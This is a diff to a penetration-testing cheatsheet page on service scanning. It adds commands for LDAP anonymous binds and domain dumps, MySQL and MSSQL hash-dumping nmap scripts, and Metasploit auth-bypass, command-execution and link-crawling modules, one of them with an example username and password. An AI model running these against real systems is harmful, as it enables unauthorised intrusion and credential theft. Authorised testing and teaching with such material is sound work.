@@ -3,7 +3,7 @@ layout: post
 title: pen / net / scan
 category: pen
 parent: cheatsheets
-modified_date: 2023-07-13
+modified_date: 2023-07-20
 permalink: /pen/net/scan
 tags: discovery scan nmap TA0007 T1595 T1046
 ---
@@ -177,13 +177,32 @@ https://$ztarg_computer_ip:5601
 ```
 
 ### <a name='ldap'></a>ldap
-* default port: 389
+* default port: 389, 636 (ldaps)
 * [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap) / [politoinic](https://www.politoinic.com/post/ldap-queries-for-offensive-and-defensive-operations) / [theitbros](https://theitbros.com/ldap-query-examples-active-directory/) / [specterops](https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb) 
+* loots : ssh public key, passwords, dump
 
 ```sh
-nmap -sV --script "" -p 389 $ztarg_computer_ip
-```
+# scan nmap
+nmap -n -sV --script "ldap* and not brute" $ztarg_computer_ip
 
+# login / anonymous / 
+ldapsearch -x -H ldap://$ztarg_computer_ip -D '' -w '' -b $ztarg_ou
+
+# login / anonymous / bypass tls sni
+ldapsearch -x -H ldaps://$ztarg_computer_ip:636/ -s base -b '' "(objectClass=*)" "*" +
+
+# login / valid account
+ldapsearch -x -H ldap://$ztarg_computer_ip -D $zdom'\'$ztarg_user_name -w $ztarg_user_pass -b $ztarg_ou
+
+# login / kerberos cache
+
+# dump / 
+pip3 install ldapdomaindump 
+# dump / V1
+ldapdomaindump $ztarg_computer_ip -u $zdom'\'$ztarg_user_name -p $ztarg_user_pass --no-json --no-grep -o /tmp/$zcase"_"$ztarg_computer_ip"_ldap.dmp"
+# dump / V2
+ldapdomaindump -r $ztarg_computer_ip -u $zdom'\'$ztarg_user_name -p $ztarg_user_pass --authtype SIMPLE --no-json --no-grep -o /tmp/$zcase"_"$ztarg_computer_ip"_ldap.dmp"
+```
 
 ### <a name='mongodb'></a>mongodb
 * default port: 27017
@@ -195,19 +214,41 @@ nmap -sV --script "mongo* and default" -p 27017 $ztarg_computer_ip
 
 ### <a name='mysql'></a>mysql
 * default port: 3306
-* [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
+* [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql) / [ssrf](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf)
 
 ```sh
-nmap -Pn -sS -sV --script "" -p 3306 $ztarg_computer_ip
+# scan / nmap
+nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ztarg_computer_ip
+
+# scan / metasploit
+use auxiliary/scanner/mysql/mysql_version
+use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+use auxiliary/scanner/mysql/mysql_hashdump #Creds
+use auxiliary/admin/mysql/mysql_enum #Creds
+use auxiliary/scanner/mysql/mysql_schemadump #Creds 
+use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
+
+# login / local
+mysql -u root # Connect to root without password
+mysql -u root -p # A password will be asked (check someone)
+mysql -u root -h 127.0.0.1 -e 'show databases;'
+
+# login / remote
+mysql -h $ztarg_computer_ip -u root
+mysql -h $ztarg_computer_ip -u root@localhost
 ```
 
 ### <a name='mssql'></a>mssql
 * default port: 1433
-* [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) / [mdf](https://docs.fileformat.com/database/mdf/) / 
+* [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) / [mdf](https://docs.fileformat.com/database/mdf/) / [abuse-ad-mssql](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
 
 ```sh
-# scan nmap
+# scan / nmap
 sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=ntgis,mssql.password=Password1,mssql-instance-name=LUXSI -Pn -sV -p 1433 $ztarg_computer_ip
+
+# scan / metasploit / trusted links 
+# set username, password, windows auth (if using AD), IP...
+use exploit/windows/mssql/mssql_linkcrawler
 ```
 
 ### <a name='neo4j'></a>neo4j
@@ -221,7 +262,6 @@ nmap -Pn -sS -sV --script "" -p 7474 $ztarg_computer_ip
 #login 
 https://$ztarg_computer_ip:7474
 ```
-
 
 ### <a name='nfs'></a>nfs
 * default port: 2049
